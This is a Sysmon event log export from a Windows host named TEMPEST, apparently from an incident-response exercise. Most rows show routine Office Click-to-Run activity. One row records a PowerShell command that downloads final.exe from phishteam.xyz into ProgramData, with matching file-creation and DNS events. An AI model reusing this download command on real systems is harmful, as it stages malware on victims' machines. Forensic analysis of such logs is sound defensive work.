1275,8780,2022-06-20 17:20:51.4225351,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,Process creation,NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,"MD5=EA8B4C4EE76CA3D8ED79F4FA29C98C72,SHA256=500F3CAF08A23D974FF1F9E8DCB2861E0000074237EC6596D5DE0BEE5FA4E6CD,IMPHASH=9888EB5B893C95B7CDFCFEBB6A2E6CB5",ParentProcess: C:\Windows\System32\services.exe,"ParentProcessID: 608, ParentProcessGUID: 4bbef3ae-8422-62b0-0b00-000000000700",ParentCommandLine: C:\Windows\system32\services.exe,"""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:20:51.341""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""FileVersion"",""#text"":""16.0.15225.20286""},{""@Name"":""Description"",""#text"":""Microsoft Office Click-to-Run (SxS)""},{""@Name"":""Product"",""#text"":""Microsoft Office""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""OfficeClickToRun.exe""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe\"" /service""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-8422-62b0-e703-000000000000""},{""@Name"":""LogonId"",""#text"":""0x3E7""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""System""},{""@Name"":""Hashes"",""#text"":""MD5=EA8B4C4EE76CA3D8ED79F4FA29C98C72,SHA256=500F3CAF08A23D974FF1F9E8DCB2861E0000074237EC6596D5DE0BEE5FA4E6CD,IMPHASH=9888EB5B893C95B7CDFCFEBB6A2E6CB5""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-8422-62b0-0b00-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""608""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\services.exe""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1276,8781,2022-06-20 17:20:51.7765106,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Microsoft Office 15\ClientX64\IntegratedOffice.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:20:51.762""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Microsoft Office 15\\ClientX64\\IntegratedOffice.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:05:48.991""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1277,8782,2022-06-20 17:20:51.7967730,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Microsoft Office 15\ClientX64\OfficeClickToRun.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:20:51.793""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Microsoft Office 15\\ClientX64\\OfficeClickToRun.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:05:48.991""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1278,8783,2022-06-20 17:20:53.6540062,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,21,S-1-5-18,DNSEvent (DNS query),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,QueryName: ecs.office.com,QueryStatus: 0,QueryResults: type:  5 ecs.office.trafficmanager.net;type:  5 s-0005-office.config.skype.com;type:  5 ecs-office.s-0005.s-msedge.net;type:  5 s-0005.s-msedge.net;2620:1ec:42::132;::ffff:52.113.194.132;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:06:50.271""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""QueryName"",""#text"":""ecs.office.com""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""type:  5 ecs.office.trafficmanager.net;type:  5 s-0005-office.config.skype.com;type:  5 ecs-office.s-0005.s-msedge.net;type:  5 s-0005.s-msedge.net;2620:1ec:42::132;::ffff:52.113.194.132;""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1279,8784,2022-06-20 17:21:05.8292068,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 3712, ProcessGUID: 4bbef3ae-ac81-62b0-bd0a-000000000700",RuleName: -,"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",ParentProcess: C:\Windows\System32\wsmprovhost.exe,"ParentProcessID: 4208, ParentProcessGUID: 4bbef3ae-ac0a-62b0-b00a-000000000700",ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" iwr http://phishteam.xyz/02dcf07/final.exe -outfile C:\ProgramData\final.exe",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:05.827""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac81-62b0-bd0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3712""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows PowerShell""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""PowerShell.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" iwr http://phishteam.xyz/02dcf07/final.exe -outfile C:\\ProgramData\\final.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\Downloads\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ac09-62b0-acd5-c10100000000""},{""@Name"":""LogonId"",""#text"":""0x1C1D5AC""},{""@Name"":""TerminalSessionId"",""#text"":""0""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-ac0a-62b0-b00a-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""4208""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\wsmprovhost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\wsmprovhost.exe -Embedding""},{""@Name"":""ParentUser"",""#text"":""TEMPEST\\benimaru""}]}}"
1280,8785,2022-06-20 17:21:06.0024981,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 3712, ProcessGUID: 4bbef3ae-ac81-62b0-bd0a-000000000700",RuleName: -,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_za44ka3b.04h.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:05.967""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac81-62b0-bd0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3712""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_za44ka3b.04h.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:21:05.967""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
1281,8786,2022-06-20 17:21:06.2938338,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 3712, ProcessGUID: 4bbef3ae-ac81-62b0-bd0a-000000000700",RuleName: EXE,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,TargetFilename: C:\ProgramData\final.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:06.279""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac81-62b0-bd0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3712""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\ProgramData\\final.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:21:06.279""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
1282,8787,2022-06-20 17:21:08.1706382,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,21,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 3712, ProcessGUID: 00000000-0000-0000-0000-000000000000",RuleName: -,Image: &lt;unknown process&gt;,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:07:04.789""},{""@Name"":""ProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ProcessId"",""#text"":""3712""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""&lt;unknown process&gt;""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
1283,8788,2022-06-20 17:21:14.3893160,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1042,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\Word.AutoRecovery.8\shell\Open\command\(Default),"Details: ""C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE"" /n ""%%1"" /o ""%%u""",,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1042""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\Word.AutoRecovery.8\\shell\\Open\\command\\(Default)""},{""@Name"":""Details"",""#text"":""\""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\"" /n \""%%1\"" /o \""%%u\""""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1284,8789,2022-06-20 17:21:14.3901889,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: T1042,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKCR\Word.AutoRecovery.8\shell\ViewProtected\command\(Default),"Details: ""C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE"" /vp ""%%1""",,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""T1042""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKCR\\Word.AutoRecovery.8\\shell\\ViewProtected\\command\\(Default)""},{""@Name"":""Details"",""#text"":""\""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\"" /vp \""%%1\""""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1285,8790,2022-06-20 17:21:14.3958572,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msoxmled.exe\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\ProgramFilesCommonX86\Microsoft Shared\OFFICE16\MSOXMLED.EXE,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msoxmled.exe\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\ProgramFilesCommonX86\\Microsoft Shared\\OFFICE16\\MSOXMLED.EXE""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1286,8791,2022-06-20 17:21:14.3959012,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msoxmled.exe\UseURL,Details: 1,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msoxmled.exe\\UseURL""},{""@Name"":""Details"",""#text"":""1""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1287,8792,2022-06-20 17:21:14.3959378,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SKYPESERVER.EXE\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\Office16\SkypeSrv\SKYPESERVER.EXE,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SKYPESERVER.EXE\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\SkypeSrv\\SKYPESERVER.EXE""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1288,8793,2022-06-20 17:21:14.3959719,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SKYPESERVER.EXE\Path,Details: C:\Program Files (x86)\Microsoft Office\Root\Office16\SkypeSrv\,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SKYPESERVER.EXE\\Path""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\SkypeSrv\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1289,8794,2022-06-20 17:21:14.3960065,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SKYPESERVER.EXE\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\Office16\SkypeSrv\SKYPESERVER.EXE,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SKYPESERVER.EXE\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\SkypeSrv\\SKYPESERVER.EXE""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1290,8795,2022-06-20 17:21:14.3960402,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SKYPESERVER.EXE\Path,Details: C:\Program Files (x86)\Microsoft Office\Root\Office16\SkypeSrv\,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SKYPESERVER.EXE\\Path""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\SkypeSrv\\""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1291,8796,2022-06-20 17:21:14.3962665,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\MsoHtmEd.exe\UseURL,Details: 1,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\MsoHtmEd.exe\\UseURL""},{""@Name"":""Details"",""#text"":""1""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
1292,8797,2022-06-20 17:21:14.3963094,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,21,S-1-5-18,RegistryEvent (Value Set),NT AUTHORITY\SYSTEM,,"ProcessID: 3848, ProcessGUID: 4bbef3ae-ac73-62b0-ba0a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,EventType: SetValue,TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msoxmled.exe\(Default),Details: C:\Program Files (x86)\Microsoft Office\Root\VFS\ProgramFilesCommonX64\Microsoft Shared\OFFICE16\MSOXMLED.EXE,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:21:14.388""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-ac73-62b0-ba0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""3848""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetObject"",""#text"":""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msoxmled.exe\\(Default)""},{""@Name"":""Details"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\VFS\\ProgramFilesCommonX64\\Microsoft Shared\\OFFICE16\\MSOXMLED.EXE""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
